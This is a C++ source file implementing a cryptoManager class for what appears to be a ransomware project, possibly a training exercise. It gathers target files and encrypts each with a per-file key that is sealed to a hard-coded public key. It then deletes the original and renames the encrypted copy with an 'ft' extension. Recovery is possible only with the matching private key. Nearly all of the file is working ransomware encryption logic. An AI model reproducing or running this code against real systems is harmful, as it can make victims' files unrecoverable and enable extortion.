#include "CryptoManager.hpp"
#include "Logs.hpp"
#include <iostream>
#include <fstream>

// Constructor - Destructor
cryptoManager::~cryptoManager()
{
}
cryptoManager::cryptoManager(Config &conf, Logs &logs) : _conf(conf), _logs(logs), _header(HEADER_SIZE)
{
    _buffer.resize(BUFFER_SIZE);
    _files = _filemanager.getTargetFiles();
}
// Initializes libsodium
void cryptoManager::init()
{
    if (sodium_init() < 0)
        throw(std::runtime_error("Lipsodium initialization failed"));
}
// Call encryption or decryption depending on configuration
void cryptoManager::processFiles()
{
    if (_conf.reverse)
        decryptFiles();
    else
        encryptFiles();
}
void cryptoManager::openFileStreams(fs::path file)
{
    _in = _filemanager.openOriginalFile(file);
    if (!_in)
        throw std::ios_base::failure("Failed to open: " + file.filename().string());
    _out = _filemanager.createNewFile(file, _tmpPath);
    if (!_out)
        throw std::ios_base::failure("Creation of the new file failed for file: " + file.filename().string());
}

/**********************************************************
 *                  ENCRYPTION METHODS
 **********************************************************/

// Encrypts all target files
void cryptoManager::encryptFiles()
{
    for (auto &file : _files)
    {
        try
        {
            openFileStreams(file);
            generateSymKey();
            encryptSymmKey();
            writeEncryptSymmKey();
            initSecretStreamPush();
            writeHeader();
            writeEncryptedData();
        }
        catch (const std::exception &e)
        {
            std::cerr << e.what() << std::endl;
            continue;
        }
        fs::remove(file);
        _filemanager.addFtExt(_tmpPath);
    }
}

void cryptoManager::generateSymKey()
{
    crypto_secretbox_keygen(_symKey.data());
}
void cryptoManager::encryptSymmKey()
{
    hexToBinAsymPubKey();
    if (crypto_box_seal(_symKeyEncrypted.data(), _symKey.data(), _symKey.size(), _asymKeyPub.data()) != 0)
        throw std::runtime_error("Failed to encrypt symmetric key");
}
void cryptoManager::hexToBinAsymPubKey()
{
    if (sodium_hex2bin(_asymKeyPub.data(), _asymKeyPub.size(), ASYM_KEY_PUB.c_str(), ASYM_KEY_PUB.size(), nullptr, nullptr, nullptr) != 0)
        throw std::runtime_error("hexToBinAsymPubKey failed: invalid hex string or conversion impossible");
}

void cryptoManager::writeEncryptSymmKey()
{
    if (!_out.write(reinterpret_cast<const char *>(_symKeyEncrypted.data()), _symKeyEncrypted.size()))
        throw std::ios_base::failure("Write encrypted key failed");
}

void cryptoManager::initSecretStreamPush()
{
    if (crypto_secretstream_xchacha20poly1305_init_push(&_state, _header.data(), _symKey.data()) != 0)
        throw std::runtime_error("Failed to initialize XChaCha20-Poly1305 stream");
    sodium_memzero(_symKey.data(), _symKey.size());
}

void cryptoManager::writeHeader()
{
    if (!_out.write(reinterpret_cast<const char *>(_header.data()), _header.size()))
        throw std::ios_base::failure("Write secretstream header failed");
}

void cryptoManager::writeEncryptedData()
{
    _in.peek();
    if (_in.eof())
        addFinalTag();
    while (_in)
    {
        _in.read(reinterpret_cast<char *>(_buffer.data()), _buffer.size());
        if (_in.bad())
            throw std::ios_base::failure("Read data in file failed");
        std::streamsize bytesRead = _in.gcount();
        if (bytesRead > 0)
            cryptAndWriteData(bytesRead);
    }
}

void cryptoManager::cryptAndWriteData(std::streamsize bytesRead)
{
    unsigned long long clen;
    _encryptedBuffer.resize(bytesRead + STREAM_MAC_SIZE);
    if (crypto_secretstream_xchacha20poly1305_push(&_state, _encryptedBuffer.data(), &clen, _buffer.data(), bytesRead, nullptr, 0, 0) != 0)
        throw std::runtime_error("Encryption data block failed");
    if (!_out.write(reinterpret_cast<char *>(_encryptedBuffer.data()), clen))
        throw std::ios_base::failure("Write encrypted data block failed");
}

void cryptoManager::addFinalTag()
{
    unsigned long long clen;
    std::vector<unsigned char> buff(STREAM_MAC_SIZE);

    if (crypto_secretstream_xchacha20poly1305_push(&_state, buff.data(), &clen, nullptr, 0, nullptr, 0, TAG_FINAL) != 0)
        throw std::runtime_error("secretstream_push failed while generating final tag");

    if (!_out.write(reinterpret_cast<char *>(buff.data()), clen))
        throw std::ios_base::failure("Write final tag failed");
}

/**********************************************************
 *                  DECRYPTION METHODS
 **********************************************************/

// Decrypts all target files
void cryptoManager::decryptFiles()
{
    try
    {
        hexToBinAsymPrivKey();
        hexToBinAsymPubKey();
    }
    catch (const std::exception &e)
    {
        throw;
    }
    for (auto &file : _files)
    {
        try
        {
            openFileStreams(file);
            readEncryptedSymKey();
            decryptSymKey();
            readSecretStreamHeader();
            initSecretStreamPull();
        }
        catch (const std::exception &e)
        {
            std::cerr << e.what() << std::endl;
            continue;
        }
        writeDecryptedData();
        fs::remove(file);
        _filemanager.removeFtExt(_tmpPath);
    }
    sodium_memzero(_asymKeyPriv.data(), _asymKeyPriv.size());
}
void cryptoManager::hexToBinAsymPrivKey()
{
    if (sodium_hex2bin(_asymKeyPriv.data(), _asymKeyPriv.size(), _conf.reverseKey.c_str(), _conf.reverseKey.size(), nullptr, nullptr, nullptr) != 0)
        throw std::runtime_error("hexToBinAsymPrivKey failed: invalid hex string or conversion impossible");
}

void cryptoManager::readEncryptedSymKey()
{
    _in.read(reinterpret_cast<char *>(_symKeyEncrypted.data()), _symKeyEncrypted.size());
    if (_in.bad())
        throw std::ios_base::failure("Read encrypted sym key in file failed");
}
void cryptoManager::decryptSymKey()
{
    if (crypto_box_seal_open(_symKey.data(), _symKeyEncrypted.data(), _symKeyEncrypted.size(), _asymKeyPub.data(), _asymKeyPriv.data()) != 0)
        throw std::runtime_error("Failed to decrypt sym key");
}

void cryptoManager::readSecretStreamHeader()
{
    _in.read(reinterpret_cast<char *>(_header.data()), _header.size());
    if (_in.bad())
        throw std::ios_base::failure("Read secretstream header in file failed");
}

void cryptoManager::initSecretStreamPull()
{
    if (crypto_secretstream_xchacha20poly1305_init_pull(&_state, _header.data(), _symKey.data()) != 0)
        throw std::runtime_error("InitSecretStreamPull failed: Invalid key or header");
    sodium_memzero(_symKey.data(), _symKey.size());
}

void cryptoManager::writeDecryptedData()
{
    _encryptedBuffer.resize(ENCRYPTED_BUFFER_SIZE);
    unsigned char tag;
    unsigned long long out_len;

    while (_in)
    {
        try
        {
            readCryptedData();
            std::streamsize bytesRead = _in.gcount();
            if (bytesRead > 0){
                decryptData(tag, out_len, bytesRead);
                writeDecryptedData(out_len);
            }
            if (tag == TAG_FINAL)
            break;
        }
        catch (const std::exception &e)
        {
            throw;
        }
       
    }
}

void cryptoManager::readCryptedData()
{
    _in.read(reinterpret_cast<char *>(_encryptedBuffer.data()), _encryptedBuffer.size());
    if (_in.bad())
        throw std::ios_base::failure("Read crypted data block in file failed");
}

void cryptoManager::decryptData(unsigned char &tag, unsigned long long &out_len, std::streamsize bytesRead)
{
    if (crypto_secretstream_xchacha20poly1305_pull(&_state, _buffer.data(), &out_len, &tag, _encryptedBuffer.data(), bytesRead, nullptr, 0) != 0)
        throw std::runtime_error("Data block decryption failed");
}

void cryptoManager::writeDecryptedData( unsigned long long out_len){
     if (!_out.write(reinterpret_cast<char *>(_buffer.data()), out_len))
         throw std::ios_base::failure("Write decrypted data block in file failed");
}
